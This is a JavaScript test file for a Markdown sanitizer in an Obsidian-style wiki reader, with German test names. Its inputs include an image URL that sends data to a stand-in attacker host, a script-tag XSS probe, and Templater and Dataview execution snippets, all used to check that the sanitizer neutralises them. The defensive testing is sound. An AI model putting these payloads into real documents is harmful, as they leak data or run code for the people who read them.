import { test } from 'node:test';
import assert from 'node:assert/strict';
import { safeWikiMarkdown, breakTemplater } from '../src/lesen/wiki-markdown.js';

const ZW = '​';

test('Wiki-Markdown: fremde Bilder werden Links, Wiki-Embeds bleiben', () => {
  assert.equal(safeWikiMarkdown('![x](https://evil.example/?d=geheim)'), '[x](https://evil.example/?d=geheim)');
  assert.equal(safeWikiMarkdown('![x][ref]\n\n[ref]: https://evil.example/r'), '[x][ref]\n\n[ref]: https://evil.example/r');
  assert.equal(safeWikiMarkdown('![[bild.png]] und [[seite|Seite]]'), '![[bild.png]] und [[seite|Seite]]');
});

test('Wiki-Markdown: HTML wird Text, Autolinks bleiben, Code bleibt wörtlich', () => {
  assert.equal(safeWikiMarkdown('<script>alert(1)</script> <img src=x>'), '&lt;script>alert(1)&lt;/script> &lt;img src=x>');
  assert.equal(safeWikiMarkdown('Quelle: <https://glaser.test/a?b=1>'), 'Quelle: <https://glaser.test/a?b=1>');
  assert.equal(safeWikiMarkdown('`a < b` und ``x ` <y>``'), '`a < b` und ``x ` <y>``');
  assert.equal(safeWikiMarkdown('```html\n<b>roh</b>\n```\n<b>'), '```html\n<b>roh</b>\n```\n&lt;b>');
  assert.equal(safeWikiMarkdown('ein ` allein <b>'), 'ein ` allein &lt;b>');
});

test('Wiki-Markdown: Templater, Dataview und Abfrage-Blöcke laufen nicht', () => {
  assert.equal(safeWikiMarkdown('<%* tR += 1 %>'), '&lt;%* tR += 1 %>');
  assert.equal(safeWikiMarkdown('`<% tp.file.title %>`'), `\`<${ZW}% tp.file.title %>\``);
  assert.equal(safeWikiMarkdown('```js\n<% x %>\n```'), `\`\`\`js\n<${ZW}% x %>\n\`\`\``);
  assert.equal(breakTemplater('Titel <% x %>'), `Titel <${ZW}% x %>`);
  assert.equal(safeWikiMarkdown('`= this.file.name` und `$= dv.pages()`'), `\`${ZW}= this.file.name\` und \`${ZW}$= dv.pages()\``);
  for (const lang of ['dataviewjs', 'dataview', 'query', 'tasks', 'DataviewJS']) {
    assert.equal(safeWikiMarkdown(`\`\`\`${lang}\nx\n\`\`\``), '```text\nx\n```', lang);
  }
  assert.equal(safeWikiMarkdown('> [!note]\n> ````dataviewjs title\n> x\n> ````'), '> [!note]\n> ````text title\n> x\n> ````');
  assert.equal(safeWikiMarkdown('- ~~~query\n  x\n  ~~~'), '- ~~~text\n  x\n  ~~~');
  assert.equal(safeWikiMarkdown('```dataviewjsx\nx\n```'), '```dataviewjsx\nx\n```', 'nur die genannten Sprachen');
});

test('Wiki-Markdown: zweimal angewandt ändert nichts mehr', () => {
  const evil = '![x](https://e/?d=1) <i>\n```dataview\nLIST\n```\n`$= 1` `<% a %>` <%* b %>';
  const once = safeWikiMarkdown(evil);
  assert.equal(safeWikiMarkdown(once), once);
});
